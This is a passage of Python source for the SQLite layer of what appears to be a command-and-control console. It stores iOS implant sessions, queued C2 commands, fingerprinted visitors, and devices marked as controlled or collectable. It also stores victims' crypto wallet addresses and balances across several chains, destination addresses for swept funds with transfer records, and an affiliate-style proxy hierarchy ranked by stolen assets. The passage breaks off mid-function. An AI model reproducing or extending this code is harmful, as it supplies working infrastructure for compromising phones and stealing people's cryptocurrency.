"""
SQLite persistence layer.
All visitors, telemetry events, sessions, and commands are persisted to disk.
Data survives server restarts and supports historical queries.
"""

from __future__ import annotations

import json
import os
import sqlite3
import time
import threading
from pathlib import Path
from typing import Any, Optional

DB_PATH = Path(os.environ.get("CONSOLE_DB_PATH", "")).expanduser() if os.environ.get("CONSOLE_DB_PATH") else Path(__file__).resolve().parent.parent / "data" / "console.db"

_local = threading.local()


def _get_conn() -> sqlite3.Connection:
    if not hasattr(_local, "conn") or _local.conn is None:
        DB_PATH.parent.mkdir(parents=True, exist_ok=True)
        _local.conn = sqlite3.connect(str(DB_PATH), check_same_thread=False)
        _local.conn.row_factory = sqlite3.Row
        _local.conn.execute("PRAGMA journal_mode=WAL")
        _local.conn.execute("PRAGMA synchronous=NORMAL")
    return _local.conn


def init_db():
    conn = _get_conn()
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS visitors (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            visit_id    TEXT UNIQUE NOT NULL,
            ip          TEXT NOT NULL DEFAULT '',
            user_agent  TEXT NOT NULL DEFAULT '',
            device_model TEXT NOT NULL DEFAULT '',
            ios_version TEXT NOT NULL DEFAULT '',
            screen_w    INTEGER DEFAULT 0,
            screen_h    INTEGER DEFAULT 0,
            language    TEXT NOT NULL DEFAULT '',
            platform    TEXT NOT NULL DEFAULT '',
            referrer    TEXT NOT NULL DEFAULT '',
            page_url    TEXT NOT NULL DEFAULT '',
            fingerprint TEXT NOT NULL DEFAULT '',
            extra       TEXT NOT NULL DEFAULT '{}',
            created_at  REAL NOT NULL DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS telemetry_events (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            event_id    TEXT NOT NULL,
            channel_code TEXT NOT NULL DEFAULT '',
            device_version TEXT NOT NULL DEFAULT '',
            domain      TEXT NOT NULL DEFAULT '',
            ip          TEXT NOT NULL DEFAULT '',
            event_type  TEXT NOT NULL DEFAULT '',
            raw_body    TEXT NOT NULL DEFAULT '{}',
            created_at  REAL NOT NULL DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS implant_sessions (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id  TEXT UNIQUE NOT NULL,
            device_id   TEXT NOT NULL DEFAULT '',
            ip          TEXT NOT NULL DEFAULT '',
            ios_version TEXT NOT NULL DEFAULT '',
            last_heartbeat REAL NOT NULL DEFAULT 0,
            is_alive    INTEGER NOT NULL DEFAULT 1,
            created_at  REAL NOT NULL DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS c2_commands (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            command_id  TEXT NOT NULL,
            session_id  TEXT NOT NULL DEFAULT '',
            cmd         TEXT NOT NULL DEFAULT '',
            args        TEXT NOT NULL DEFAULT '{}',
            status      TEXT NOT NULL DEFAULT 'pending',
            response    TEXT NOT NULL DEFAULT '',
            created_at  REAL NOT NULL DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS webhook_config (
            id          INTEGER PRIMARY KEY CHECK (id = 1),
            webhook_url TEXT NOT NULL DEFAULT '',
            webhook_type TEXT NOT NULL DEFAULT 'generic',
            enabled     INTEGER NOT NULL DEFAULT 0,
            updated_at  REAL NOT NULL DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS devices (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id   TEXT UNIQUE NOT NULL,
            name        TEXT NOT NULL DEFAULT '',
            host        TEXT NOT NULL DEFAULT '',
            port        TEXT NOT NULL DEFAULT '',
            ip          TEXT NOT NULL DEFAULT '',
            uid         TEXT NOT NULL DEFAULT '',
            ios_version TEXT NOT NULL DEFAULT '',
            domain      TEXT NOT NULL DEFAULT '',
            tasks       INTEGER NOT NULL DEFAULT 0,
            threads     INTEGER NOT NULL DEFAULT 1,
            controlled  INTEGER NOT NULL DEFAULT 0,
            authorized  INTEGER NOT NULL DEFAULT 0,
            collectable INTEGER NOT NULL DEFAULT 0,
            visitor_id  TEXT NOT NULL DEFAULT '',
            session_id  TEXT NOT NULL DEFAULT '',
            note        TEXT NOT NULL DEFAULT '',
            proxy_id    TEXT NOT NULL DEFAULT '',
            created_at  REAL NOT NULL DEFAULT 0,
            updated_at  REAL NOT NULL DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS proxies (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            proxy_id    TEXT UNIQUE NOT NULL,
            parent_proxy_id TEXT NOT NULL DEFAULT '',
            channel_code TEXT NOT NULL DEFAULT '',
            login_username TEXT NOT NULL DEFAULT '',
            name        TEXT NOT NULL DEFAULT '',
            device_count INTEGER NOT NULL DEFAULT 0,
            total_assets REAL NOT NULL DEFAULT 0,
            status      TEXT NOT NULL DEFAULT 'active',
            note        TEXT NOT NULL DEFAULT '',
            last_check_at REAL NOT NULL DEFAULT 0,
            created_at  REAL NOT NULL DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS collect_addresses (
            id          INTEGER PRIMARY KEY CHECK (id = 1),
            trx_usdt    TEXT NOT NULL DEFAULT '',
            eth_usdc    TEXT NOT NULL DEFAULT '',
            btc         TEXT NOT NULL DEFAULT '',
            updated_at  REAL NOT NULL DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS collect_records (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            record_id   TEXT UNIQUE NOT NULL,
            device_id   TEXT NOT NULL DEFAULT '',
            chain       TEXT NOT NULL DEFAULT '',
            amount      REAL NOT NULL DEFAULT 0,
            tx_hash     TEXT NOT NULL DEFAULT '',
            status      TEXT NOT NULL DEFAULT 'pending',
            created_at  REAL NOT NULL DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS cold_addresses (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            cold_id     TEXT UNIQUE NOT NULL,
            chain       TEXT NOT NULL DEFAULT '',
            address     TEXT NOT NULL DEFAULT '',
            label       TEXT NOT NULL DEFAULT '',
            balance     REAL NOT NULL DEFAULT 0,
            last_active REAL NOT NULL DEFAULT 0,
            created_at  REAL NOT NULL DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS console_settings (
            key         TEXT PRIMARY KEY,
            value       TEXT NOT NULL DEFAULT '{}',
            updated_at  REAL NOT NULL DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS users (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            username    TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL DEFAULT '',
            role        TEXT NOT NULL DEFAULT 'admin',
            created_at  REAL NOT NULL DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS audit_log (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            who         TEXT NOT NULL DEFAULT 'admin',
            action      TEXT NOT NULL DEFAULT '',
            resource    TEXT NOT NULL DEFAULT '',
            detail      TEXT NOT NULL DEFAULT '',
            created_at  REAL NOT NULL DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS device_assets (
            id           INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id    TEXT UNIQUE NOT NULL,
            eth_address  TEXT NOT NULL DEFAULT '',
            trx_address  TEXT NOT NULL DEFAULT '',
            btc_address  TEXT NOT NULL DEFAULT '',
            eth_usdc     REAL NOT NULL DEFAULT 0,
            trx_usdt     REAL NOT NULL DEFAULT 0,
            btc          REAL NOT NULL DEFAULT 0,
            total_usd    REAL NOT NULL DEFAULT 0,
            wallet_count INTEGER NOT NULL DEFAULT 0,
            status       TEXT NOT NULL DEFAULT 'unknown',
            source       TEXT NOT NULL DEFAULT 'manual',
            scan_error   TEXT NOT NULL DEFAULT '',
            last_scan_at REAL NOT NULL DEFAULT 0,
            updated_at   REAL NOT NULL DEFAULT 0
        );

    """)
    conn.execute("""
        INSERT OR IGNORE INTO webhook_config (id, webhook_url, webhook_type, enabled, updated_at)
        VALUES (1, '', 'generic', 0, 0)
    """)
    conn.execute("""
        INSERT OR IGNORE INTO collect_addresses (id, trx_usdt, eth_usdc, btc, updated_at)
        VALUES (1, '', '', '', 0)
    """)
    conn.commit()
    _migrate_schema(conn)
    _ensure_indexes(conn)


def _ensure_indexes(conn: sqlite3.Connection) -> None:
    """Create indexes after migrations so older DB files upgrade cleanly."""
    indexes = [
        "CREATE INDEX IF NOT EXISTS idx_visitors_created ON visitors(created_at)",
        "CREATE INDEX IF NOT EXISTS idx_telemetry_created ON telemetry_events(created_at)",
        "CREATE INDEX IF NOT EXISTS idx_sessions_alive ON implant_sessions(is_alive)",
        "CREATE INDEX IF NOT EXISTS idx_devices_session ON devices(session_id)",
        "CREATE INDEX IF NOT EXISTS idx_devices_proxy ON devices(proxy_id)",
        "CREATE INDEX IF NOT EXISTS idx_collect_records_created ON collect_records(created_at)",
        "CREATE INDEX IF NOT EXISTS idx_device_assets_updated ON device_assets(updated_at)",
    ]
    for sql in indexes:
        try:
            conn.execute(sql)
        except sqlite3.OperationalError:
            pass
    conn.commit()


def _migrate_schema(conn: sqlite3.Connection) -> None:
    """Best-effort column migrations for existing databases."""
    migrations = [
        "ALTER TABLE c2_commands ADD COLUMN session_id TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE implant_sessions ADD COLUMN implant_token TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE device_assets ADD COLUMN eth_address TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE device_assets ADD COLUMN trx_address TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE device_assets ADD COLUMN btc_address TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE device_assets ADD COLUMN scan_error TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE device_assets ADD COLUMN eth_usdt REAL NOT NULL DEFAULT 0",
        "ALTER TABLE device_assets ADD COLUMN eth_native REAL NOT NULL DEFAULT 0",
        "ALTER TABLE device_assets ADD COLUMN trx_native REAL NOT NULL DEFAULT 0",
        "ALTER TABLE device_assets ADD COLUMN bsc_address TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE device_assets ADD COLUMN bsc_usdt REAL NOT NULL DEFAULT 0",
        "ALTER TABLE device_assets ADD COLUMN bsc_native REAL NOT NULL DEFAULT 0",
        "ALTER TABLE device_assets ADD COLUMN sol_address TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE device_assets ADD COLUMN sol_usdt REAL NOT NULL DEFAULT 0",
        "ALTER TABLE device_assets ADD COLUMN sol_native REAL NOT NULL DEFAULT 0",
        "ALTER TABLE device_assets ADD COLUMN tokens_json TEXT NOT NULL DEFAULT '{}'",
        "ALTER TABLE collect_addresses ADD COLUMN eth_usdt TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE collect_addresses ADD COLUMN eth_native TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE collect_addresses ADD COLUMN trx_native TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE collect_addresses ADD COLUMN bsc_usdt TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE collect_addresses ADD COLUMN bsc_native TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE collect_addresses ADD COLUMN sol_usdt TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE collect_addresses ADD COLUMN sol_native TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE proxies ADD COLUMN parent_proxy_id TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE proxies ADD COLUMN channel_code TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE proxies ADD COLUMN login_username TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE devices ADD COLUMN proxy_id TEXT NOT NULL DEFAULT ''",
        "ALTER TABLE users ADD COLUMN proxy_id TEXT NOT NULL DEFAULT ''",
    ]
    for sql in migrations:
        try:
            conn.execute(sql)
            conn.commit()
        except sqlite3.OperationalError:
            pass


# ── Visitor CRUD ─────────────────────────────────────────────────────────────

def save_visitor(data: dict) -> int:
    conn = _get_conn()
    cur = conn.execute("""
        INSERT OR REPLACE INTO visitors
        (visit_id, ip, user_agent, device_model, ios_version, screen_w, screen_h,
         language, platform, referrer, page_url, fingerprint, extra, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        data.get("visit_id", ""),
        data.get("ip", ""),
        data.get("user_agent", ""),
        data.get("device_model", ""),
        data.get("ios_version", ""),
        data.get("screen_w", 0),
        data.get("screen_h", 0),
        data.get("language", ""),
        data.get("platform", ""),
        data.get("referrer", ""),
        data.get("page_url", ""),
        data.get("fingerprint", ""),
        json.dumps(data.get("extra", {}), ensure_ascii=False),
        data.get("created_at", time.time()),
    ))
    conn.commit()
    return cur.lastrowid


def get_visitors(limit: int = 200, offset: int = 0) -> list[dict]:
    conn = _get_conn()
    rows = conn.execute(
        "SELECT * FROM visitors ORDER BY created_at DESC LIMIT ? OFFSET ?",
        (limit, offset),
    ).fetchall()
    return [dict(r) for r in rows]


def get_visitor_count() -> int:
    conn = _get_conn()
    return conn.execute("SELECT COUNT(*) FROM visitors").fetchone()[0]


# ── Telemetry CRUD ───────────────────────────────────────────────────────────

def save_telemetry(data: dict) -> int:
    conn = _get_conn()
    cur = conn.execute("""
        INSERT INTO telemetry_events
        (event_id, channel_code, device_version, domain, ip, event_type, raw_body, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        data.get("event_id", ""),
        data.get("channel_code", ""),
        data.get("device_version", ""),
        data.get("domain", ""),
        data.get("ip", ""),
        data.get("event_type", ""),
        json.dumps(data.get("raw_body", {}), ensure_ascii=False),
        data.get("created_at", time.time()),
    ))
    conn.commit()
    return cur.lastrowid


def get_telemetry(limit: int = 200, offset: int = 0) -> list[dict]:
    conn = _get_conn()
    rows = conn.execute(
        "SELECT * FROM telemetry_events ORDER BY created_at DESC LIMIT ? OFFSET ?",
        (limit, offset),
    ).fetchall()
    return [dict(r) for r in rows]


def get_telemetry_count() -> int:
    conn = _get_conn()
    return conn.execute("SELECT COUNT(*) FROM telemetry_events").fetchone()[0]


# ── Session CRUD ─────────────────────────────────────────────────────────────

def save_session(data: dict) -> int:
    conn = _get_conn()
    cur = conn.execute("""
        INSERT OR REPLACE INTO implant_sessions
        (session_id, device_id, ip, ios_version, last_heartbeat, is_alive, implant_token, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        data.get("session_id", ""),
        data.get("device_id", ""),
        data.get("ip", ""),
        data.get("ios_version", ""),
        data.get("last_heartbeat", time.time()),
        1 if data.get("is_alive", True) else 0,
        data.get("implant_token", ""),
        data.get("created_at", time.time()),
    ))
    conn.commit()
    return cur.lastrowid


# ── Command CRUD ─────────────────────────────────────────────────────────────

def save_command(data: dict) -> int:
    conn = _get_conn()
    cur = conn.execute("""
        INSERT INTO c2_commands (command_id, session_id, cmd, args, status, response, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (
        data.get("command_id", ""),
        data.get("session_id", ""),
        data.get("cmd", ""),
        json.dumps(data.get("args", {}), ensure_ascii=False),
        data.get("status", "pending"),
        json.dumps(data.get("response", ""), ensure_ascii=False),
        data.get("created_at", time.time()),
    ))
    conn.commit()
    return cur.lastrowid


def update_command_status(
    command_id: str,
    status: str,
    response: Any = "",
    session_id: str = "",
) -> None:
    conn = _get_conn()
    conn.execute(
        """
        UPDATE c2_commands
        SET status = ?, response = ?
        WHERE command_id = ?
        """,
        (
            status,
            json.dumps(response, ensure_ascii=False),
            command_id,
        ),
    )
    conn.commit()


def get_sessions_all() -> list[dict]:
    conn = _get_conn()
    rows = conn.execute(
        "SELECT * FROM implant_sessions ORDER BY last_heartbeat DESC"
    ).fetchall()
    return [dict(r) for r in rows]


def update_session_heartbeat(session_id: str, last_heartbeat: float, is_alive: bool) -> None:
    conn = _get_conn()
    conn.execute(
        """
        UPDATE implant_sessions
        SET last_heartbeat = ?, is_alive = ?
        WHERE session_id = ?
        """,
        (last_heartbeat, 1 if is_alive else 0, session_id),
    )
    conn.commit()


def get_commands_recent(limit: int = 100) -> list[dict]:
    conn = _get_conn()
    rows = conn.execute(
        "SELECT * FROM c2_commands ORDER BY created_at DESC LIMIT ?",
        (limit,),
    ).fetchall()
    return [dict(r) for r in rows]


def get_telemetry_stats() -> dict:
    conn = _get_conn()
    total = conn.execute("SELECT COUNT(*) FROM telemetry_events").fetchone()[0]
    unique_channels = conn.execute(
        "SELECT COUNT(DISTINCT channel_code) FROM telemetry_events WHERE channel_code != ''"
    ).fetchone()[0]
    unique_ips = conn.execute(
        "SELECT COUNT(DISTINCT ip) FROM telemetry_events WHERE ip != ''"
    ).fetchone()[0]
    return {
        "total_events": total,
        "unique_channels": unique_channels,
        "unique_ips": unique_ips,
    }


# ── Webhook Config ───────────────────────────────────────────────────────────

def get_webhook_config() -> dict:
    from .crypto_utils import decrypt_secret

    conn = _get_conn()
    row = conn.execute("SELECT * FROM webhook_config WHERE id = 1").fetchone()
    if not row:
        return {"webhook_url": "", "webhook_type": "generic", "enabled": False}
    data = dict(row)
    raw = data.get("webhook_url", "")
    data["webhook_url"] = decrypt_secret(raw)
    data["webhook_url_encrypted"] = raw if raw and raw != data["webhook_url"] else ""
    return data


def save_webhook_config(url: str, wtype: str, enabled: bool):
    from .crypto_utils import encrypt_secret

    conn = _get_conn()
    conn.execute("""
        UPDATE webhook_config SET webhook_url=?, webhook_type=?, enabled=?, updated_at=?
        WHERE id=1
    """, (encrypt_secret(url), wtype, 1 if enabled else 0, time.time()))
    conn.commit()


# ── Export Helpers ────────────────────────────────────────────────────────────

def export_visitors_all() -> list[dict]:
    conn = _get_conn()
    rows = conn.execute("SELECT * FROM visitors ORDER BY created_at DESC").fetchall()
    return [dict(r) for r in rows]


def export_telemetry_all() -> list[dict]:
    conn = _get_conn()
    rows = conn.execute("SELECT * FROM telemetry_events ORDER BY created_at DESC").fetchall()
    return [dict(r) for r in rows]


# ── Devices CRUD ─────────────────────────────────────────────────────────────

def _device_row_to_dict(row: sqlite3.Row) -> dict:
    d = dict(row)
    d["controlled"] = bool(d.get("controlled", 0))
    d["authorized"] = bool(d.get("authorized", 0))
    d["collectable"] = bool(d.get("collectable", 0))
    return d


def get_devices(
    *,
    authorized: Optional[bool] = None,
    collectable: Optional[bool] = None,
    controlled: Optional[bool] = None,
    proxy_ids: Optional[list[str]] = None,
) -> list[dict]:
    conn = _get_conn()
    clauses: list[str] = []
    params: list[Any] = []
    if authorized is not None:
        clauses.append("authorized = ?")
        params.append(1 if authorized else 0)
    if collectable is not None:
        clauses.append("collectable = ?")
        params.append(1 if collectable else 0)
    if controlled is not None:
        clauses.append("controlled = ?")
        params.append(1 if controlled else 0)
    if proxy_ids is not None:
        if not proxy_ids:
            return []
        placeholders = ",".join("?" for _ in proxy_ids)
        clauses.append(f"proxy_id IN ({placeholders})")
        params.extend(proxy_ids)
    where = f"WHERE {' AND '.join(clauses)}" if clauses else ""
    rows = conn.execute(
        f"SELECT * FROM devices {where} ORDER BY updated_at DESC",
        params,
    ).fetchall()
    return [_device_row_to_dict(r) for r in rows]


def get_device_by_id(device_id: str) -> Optional[dict]:
    conn = _get_conn()
    row = conn.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,)).fetchone()
    return _device_row_to_dict(row) if row else None


def get_device_by_session(session_id: str) -> Optional[dict]:
    conn = _get_conn()
    row = conn.execute(
        "SELECT * FROM devices WHERE session_id = ? ORDER BY updated_at DESC LIMIT 1",
        (session_id,),
    ).fetchone()
    return _device_row_to_dict(row) if row else None


def save_device(data: dict) -> int:
    conn = _get_conn()
    now = data.get("updated_at", time.time())
    cur = conn.execute(
        """
        INSERT INTO devices
        (device_id, name, host, port, ip, uid, ios_version, domain, tasks, threads,
         controlled, authorized, collectable, visitor_id, session_id, note, proxy_id, created_at, updated_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ON CONFLICT(device_id) DO UPDATE SET
            name=excluded.name, host=excluded.host, port=excluded.port, ip=excluded.ip,
            uid=excluded.uid, ios_version=excluded.ios_version, domain=excluded.domain,
            tasks=excluded.tasks, threads=excluded.threads, controlled=excluded.controlled,
            authorized=excluded.authorized, collectable=excluded.collectable,
            visitor_id=excluded.visitor_id, session_id=excluded.session_id,
            note=excluded.note, proxy_id=excluded.proxy_id, updated_at=excluded.updated_at
        """,
        (
            data.get("device_id", ""),
            data.get("name", ""),
            data.get("host", ""),
            data.get("port", ""),
            data.get("ip", ""),
            data.get("uid", data.get("device_id", "")),
            data.get("ios_version", ""),
            data.get("domain", ""),
            int(data.get("tasks", 0)),
            int(data.get("threads", 1)),
            1 if data.get("controlled", False) else 0,
            1 if data.get("authorized", False) else 0,
            1 if data.get("collectable", False) else 0,
            data.get("visitor_id", ""),
            data.get("session_id", ""),
            data.get("note", ""),
            data.get("proxy_id", ""),
            data.get("created_at", now),
            now,
        ),
    )
    conn.commit()
    return cur.lastrowid


def delete_device(device_id: str) -> bool:
    conn = _get_conn()
    cur = conn.execute("DELETE FROM devices WHERE device_id = ?", (device_id,))
    conn.commit()
    return cur.rowcount > 0


def get_device_stats() -> dict:
    conn = _get_conn()
    controlled = conn.execute(
        "SELECT COUNT(*) FROM devices WHERE controlled = 1"
    ).fetchone()[0]
    authorized = conn.execute(
        "SELECT COUNT(*) FROM devices WHERE authorized = 1"
    ).fetchone()[0]
    collectable = conn.execute(
        "SELECT COUNT(*) FROM devices WHERE collectable = 1"
    ).fetchone()[0]
    return {
        "controlled": controlled,
        "authorized": authorized,
        "collectable": collectable,
        "total": conn.execute("SELECT COUNT(*) FROM devices").fetchone()[0],
    }


# ── Proxies CRUD ─────────────────────────────────────────────────────────────

def get_proxies(parent_proxy_id: Optional[str] = None) -> list[dict]:
    conn = _get_conn()
    if parent_proxy_id is not None:
        rows = conn.execute(
            "SELECT * FROM proxies WHERE parent_proxy_id = ? ORDER BY created_at DESC",
            (parent_proxy_id,),
        ).fetchall()
    else:
        rows = conn.execute("SELECT * FROM proxies ORDER BY created_at DESC").fetchall()
    return [dict(r) for r in rows]


def get_proxy_by_id(proxy_id: str) -> Optional[dict]:
    conn = _get_conn()
    row = conn.execute("SELECT * FROM proxies WHERE proxy_id = ?", (proxy_id,)).fetchone()
    return dict(row) if row else None


def get_proxy_by_channel(channel_code: str) -> Optional[dict]:
    conn = _get_conn()
    row = conn.execute(
        "SELECT * FROM proxies WHERE channel_code = ? COLLATE NOCASE",
        (channel_code.strip().upper(),),
    ).fetchone()
    return dict(row) if row else None


def get_proxy_descendant_ids(proxy_id: str) -> list[str]:
    conn = _get_conn()
    rows = conn.execute("SELECT proxy_id, parent_proxy_id FROM proxies").fetchall()
    children_map: dict[str, list[str]] = {}
    for row in rows:
        parent = row["parent_proxy_id"] or ""
        children_map.setdefault(parent, []).append(row["proxy_id"])

    result = [proxy_id]

    def walk(pid: str) -> None:
        for child in children_map.get(pid, []):
            result.append(child)
            walk(child)

    walk(proxy_id)
    return result


def get_proxy_live_stats(proxy_id: str) -> dict[str, Any]:
    subtree = get_proxy_descendant_ids(proxy_id)
    conn = _get_conn()
    placeholders = ",".join("?" for _ in subtree)
    device_count = conn.execute(
        f"SELECT COUNT(*) FROM devices WHERE proxy_id IN ({placeholders})",
        subtree,
    ).fetchone()[0]
    asset_row = conn.execute(
        f"""
        SELECT COALESCE(SUM(COALESCE(a.total_usd, 0)), 0)
        FROM devices d
        LEFT JOIN device_assets a ON a.device_id = d.device_id
        WHERE d.proxy_id IN ({placeholders})
        """,
        subtree,
    ).fetchone()
    total_assets = float(asset_row[0] or 0)
    return {
        "device_count": int(device_count),
        "total_assets_usd": round(total_assets, 2),
        "proxy_ids": subtree,
    }


def get_proxy_tree(
    root_id: str = "",
    *,
    scope_ids: Optional[list[str]] = None,
) -> list[dict]:
    rows = get_proxies()
    if scope_ids is not None:
        allowed = set(scope_ids)
        rows = [r for r in rows if r["proxy_id"] in allowed]

    by_parent: dict[str, list[dict]] = {}
    for row in rows:
        parent = row.get("parent_proxy_id") or ""
        by_parent.setdefault(parent, []).append(row)

    def build(parent: str) -> list[dict]:
        nodes = []
        for row in sorted(by_parent.get(parent, []), key=lambda r: r.get("created_at", 0)):
            item = dict(row)
            item["children"] = build(row["proxy_id"])
            nodes.append(item)
        return nodes

    if root_id:
        root = get_proxy_by_id(root_id)
        if not root:
            return []
        if scope_ids is not None and root_id not in set(scope_ids):
            return []
        node = dict(root)
        node["children"] = build(root_id)
        return [node]
    return build("")


def save_proxy(data: dict) -> int:
    conn = _get_conn()
    cur = conn.execute(
        """
        INSERT INTO proxies
        (proxy_id, parent_proxy_id, channel_code, login_username, name, device_count,
         total_assets, status, note, last_check_at, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ON CONFLICT(proxy_id) DO UPDATE SET
            parent_proxy_id=excluded.parent_proxy_id,
            channel_code=excluded.channel_code,
            login_username=excluded.login_username,
            name=excluded.name, device_count=excluded.device_count,
            total_assets=excluded.total_assets, status=excluded.status,
            note=excluded.note, last_check_at=excluded.last_check_at
        """,
        (
            data.get("proxy_id", ""),
            data.get("parent_proxy_id", ""),
            data.get("channel_code", ""),
            data.get("login_username", ""),
            data.get("name", ""),
            int(data.get("device_count", 0)),
            float(data.get("total_assets", 0)),
            data.get("status", "active"),
            data.get("note", ""),
            data.get("last_check_at", time.time()),
            data.get("created_at", time.time()),
        ),
    )
    conn.commit()
    return cur.lastrowid


def delete_proxy(proxy_id: str) -> bool:
    conn = _get_conn()
    cur = conn.execute("DELETE FROM proxies WHERE proxy_id = ?", (proxy_id,))
    conn.commit()
    return cur.rowcount > 0


# ── Collect addresses / records / cold ───────────────────────────────────────

def get_collect_addresses() -> dict:
    conn = _get_conn()
    row = conn.execute("SELECT * FROM collect_addresses WHERE id = 1").fetchone()
    if not row:
        base = {key: "" for key in (
            "trx_usdt", "eth_usdc", "btc", "eth_usdt", "eth_native",
            "trx_native", "bsc_usdt", "bsc_native", "sol_usdt", "sol_native",
        )}
        base["updated_at"] = 0
        return base
    d = dict(row)
    from .collect_catalog import COLLECT_DEST_KEYS
    out = {key: d.get(key, "") or "" for key in COLLECT_DEST_KEYS}
    out["updated_at"] = d.get("updated_at", 0)
    return out


def save_collect_addresses(destinations: dict) -> None:
    from .collect_catalog import COLLECT_DEST_KEYS
    conn = _get_conn()
    now = time.time()
    values = {key: destinations.get(key, "") or "" for key in COLLECT_DEST_KEYS}
    conn.execute(
        """
        UPDATE collect_addresses SET
            trx_usdt=?, eth_usdc=?, btc=?,
            eth_usdt=?, eth_native=?, trx_native=?,
            bsc_usdt=?, bsc_native=?, sol_usdt=?, sol_native=?,
            updated_at=?
        WHERE id = 1
        """,
        (
            values["trx_usdt"], values["eth_usdc"], values["btc"],
            values["eth_usdt"], values["eth_native"], values["trx_native"],
            values["bsc_usdt"], values["bsc_native"], values["sol_usdt"], values["sol_native"],
            now,
        ),
    )
    conn.commit()


def get_collect_records(limit: int = 200) -> list[dict]:
    conn = _get_conn()
    rows = conn.execute(
        "SELECT * FROM collect_records ORDER BY created_at DESC LIMIT ?",
        (limit,),
    ).fetchall()
    return [dict(r) for r in rows]


def save_collect_record(data: dict) -> int:
    conn = _get_conn()
    cur = conn.execute(
        """
        INSERT INTO collect_records
        (record_id, device_id, chain, amount, tx_hash, status, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?)
        """,
        (
            data.get("record_id", ""),
            data.get("device_id", ""),
            data.get("chain", ""),
            float(data.get("amount", 0)),
            data.get("tx_hash", ""),
            data.get("status", "pending"),
            data.get("created_at", time.time()),
        ),
    )
    conn.commit()
    return cur.lastrowid


def get_cold_addresses() -> list[dict]:
    conn = _get_conn()
    rows = conn.execute(
        "SELECT * FROM cold_addresses ORDER BY last_active DESC"
    ).fetchall()
    return [dict(r) for r in rows]


def save_cold_address(data: dict) -> int:
    conn = _get_conn()
    cur = conn.execute(
        """
        INSERT INTO cold_addresses
        (cold_id, chain, address, label, balance, last_active, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?)
        ON CONFLICT(cold_id) DO UPDATE SET
            chain=excluded.chain, address=excluded.address, label=excluded.label,
            balance=excluded.balance, last_active=excluded.last_active
        """,
        (
            data.get("cold_id", ""),
            data.get("chain", ""),
            data.get("address", ""),
            data.get("label", ""),
            float(data.get("balance", 0)),
            data.get("last_active", time.time()),
            data.get("created_at", time.time()),
        ),
    )
    conn.commit()
    return cur.lastrowid


def delete_cold_address(cold_id: str) -> bool:
    conn = _get_conn()
    cur = conn.execute("DELETE FROM cold_addresses WHERE cold_id = ?", (cold_id,))
    conn.commit()
    return cur.rowcount > 0


# ── Console settings ─────────────────────────────────────────────────────────

def get_setting(key: str, default: str = "{}") -> str:
    conn = _get_conn()
    row = conn.execute(
        "SELECT value FROM console_settings WHERE key = ?", (key,)
    ).fetchone()
    return row[0] if row else default


def save_setting(key: str, value: str) -> None:
    conn = _get_conn()
    conn.execute(
        """
        INSERT INTO console_settings (key, value, updated_at)
        VALUES (?, ?, ?)
        ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at
        """,
        (key, value, time.time()),
    )
    conn.commit()


def get_telemetry_domains(limit: int = 12) -> list[dict]:
    conn = _get_conn()
    rows = conn.execute(
        """
        SELECT domain, COUNT(*) AS hits
        FROM telemetry_events
        WHERE domain != ''
        GROUP BY domain
        ORDER BY hits DESC
        LIMIT ?
        """,
        (limit,),
    ).fetchall()
    return [{"domain": r[0], "hits": r[1]} for r in rows]


def get_telemetry_timeline(hours: int = 24) -> list[dict]:
    conn = _get_conn()
    since = time.time() - hours * 3600
    bucket = max(int(hours * 3600 / 12), 300)
    rows = conn.execute(
        """
